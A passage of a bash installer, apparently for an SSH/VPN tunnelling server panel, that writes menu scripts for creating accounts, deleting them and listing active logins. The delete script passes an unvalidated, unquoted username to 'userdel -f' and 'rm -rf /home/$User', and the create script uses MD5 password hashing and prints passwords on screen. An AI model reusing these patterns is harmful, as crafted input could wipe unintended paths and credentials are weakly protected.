GRN22='\e[32m [\e[0m22\e[32m]\e[0m';
GRN23='\e[32m [\e[0m23\e[32m]\e[0m';
GRN24='\e[32m [\e[0m24\e[32m]\e[0m';
GRN25='\e[32m [\e[0m25\e[32m]\e[0m';
EOM

cat << \EOM> /usr/local/sbin/dextermenu
#!/bin/bash
source /usr/local/sbin/base-script

clear
echo -e ""
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo '                                                              
   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
 '
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo
echo -e "\e[1;97m Create Account\e[0m"
echo -e ""
read -p $'\e[32m  Username: \e[0m' User

# Check If Username Exist, Else Proceed
egrep "^$User" /etc/passwd >/dev/null
if [ $? -eq 0 ]; then
clear
echo -e ""
echo -e "$TITLE"
echo -e "\e[31m Username Already Exists on your server, please try another username\e[0m."
exit 0
else
read -p $'\e[32m  Password: \e[0m' Pass
#read -p $'\e[32m  Active Days: \e[0m' Days
echo -e ""
echo -e ""
clear
sleep 1
IPADDR=$(wget -4qO- http://ipinfo.io/ip)
#Today=`date +%s`
#Days_Detailed=$(( $Days * 86400 ))
#Expire_On=$(($Today + $Days_Detailed))
#Expiration=$(date -u --date="1970-01-01 $Expire_On sec GMT" +%Y/%m/%d)
#Expiration_Display=$(date -u --date="1970-01-01 $Expire_On sec GMT" '+%d %b %Y')
opensshport="$(netstat -ntlp | grep -i ssh | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g' )"
dropbearport="$(netstat -nlpt | grep -i dropbear | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g')"
stunnel4port="$(netstat -nlpt | grep -i stunnel | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g')"
openvpnport="$(netstat -nlpt | grep -i openvpn | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2 | xargs | sed -e 's/ /, /g')"
#squidport="$(cat /etc/squid/squid.conf | grep -i http_port | awk '{print $2}' | xargs | sed -e 's/ /, /g')"
squidport="8080, 8010"
websocket="80"
/usr/sbin/useradd -p $(openssl passwd -1 $Pass) -M $User --shell=/bin/false --no-create-home;
#useradd -m -s /bin/false > /dev/null
#egrep "^$User" /etc/passwd &> /dev/null
#echo -e "$Pass\n$Pass\n" | passwd $User &> /dev/null
#clear
echo -e ""
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo '                                                              
   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
 '
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo -e " Your Account:"
echo -e "\e[32m  Username: \e[0m"$User
echo -e "\e[32m  Password: \e[0m"$Pass
#echo -e "\e[32m  Account Expiry: \e[0m"$Expiration_Display
echo -e ""
echo -e "\e[32m  Host/IP: \e[0m"$IPADDR
echo -e "\e[32m  OpenSSH Port: \e[0m"$opensshport
echo -e "\e[32m  Dropbear Port: \e[0m"$dropbearport
echo -e "\e[32m  SSL Port: \e[0m"$stunnel4port
echo -e "\e[32m  Proxy Ports: \e[0m"$squidport
echo -e "\e[32m  Websockets Port: \e[0m"$websocket
echo -e ""
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
fi
EOM

cat << \EOM> /usr/local/sbin/delete
#!/bin/bash

clear
echo -e ""
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo '                                                              
   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
 '
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"

echo
read -p "Username:" User
echo -e ""
sleep 2
egrep "^$User" /etc/passwd &> /dev/null
if [ $? -eq 0 ]; then
	userdel -f $User
  rm -rf /home/$User
	clear
	echo -e ""
  echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo '                                                              
   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
 '
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
  echo
	echo -e " User Deleted"
	echo -e ""
else
	clear
	echo -e ""
  echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo '                                                              
   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
 '
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
  echo
	echo -e " User you entered does not exist"
	echo -e ""
fi
EOM

cat << \EOM> /usr/local/sbin/check
#!/bin/bash
source /usr/local/sbin/base-script

clear
echo -e ""
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo '                                                              
   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
 '
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo


if [ -e "/var/log/auth.log" ]; then
        LOG="/var/log/auth.log";
fi
if [ -e "/var/log/secure" ]; then
        LOG="/var/log/secure";
fi
                
data=( `ps aux | grep -i dropbear | awk '{print $2}'`);
echo "-----=[ Dropbear User Login ]=-----";
echo "ID  |  Username  |  IP Address";
echo "-------------------------------------";
cat $LOG | grep -i dropbear | grep -i "Password auth succeeded" > /tmp/login-db.txt;
for PID in "${data[@]}"
do
        cat /tmp/login-db.txt | grep "dropbear\[$PID\]" > /tmp/login-db-pid.txt;
        NUM=`cat /tmp/login-db-pid.txt | wc -l`;
        USER=`cat /tmp/login-db-pid.txt | awk '{print $10}'`;
        IP=`cat /tmp/login-db-pid.txt | awk '{print $12}'`;
        if [ $NUM -eq 1 ]; then
                echo "$PID - $USER - $IP";
                fi
done
echo " "
echo "-----=[ OpenSSH User Login ]=-----";
echo "ID  |  Username  |  IP Address";
echo "-------------------------------------";
cat $LOG | grep -i sshd | grep -i "Accepted password for" > /tmp/login-db.txt
data=( `ps aux | grep "\[priv\]" | sort -k 72 | awk '{print $2}'`);

for PID in "${data[@]}"
do
        cat /tmp/login-db.txt | grep "sshd\[$PID\]" > /tmp/login-db-pid.txt;
        NUM=`cat /tmp/login-db-pid.txt | wc -l`;
        USER=`cat /tmp/login-db-pid.txt | awk '{print $9}'`;
        IP=`cat /tmp/login-db-pid.txt | awk '{print $11}'`;
        if [ $NUM -eq 1 ]; then
                echo "$PID - $USER - $IP";
        fi
done

echo " "
EOM

chmod +x /usr/local/sbin/*
}


startinstall
Slowdns
controls
clear
display_menu
ports
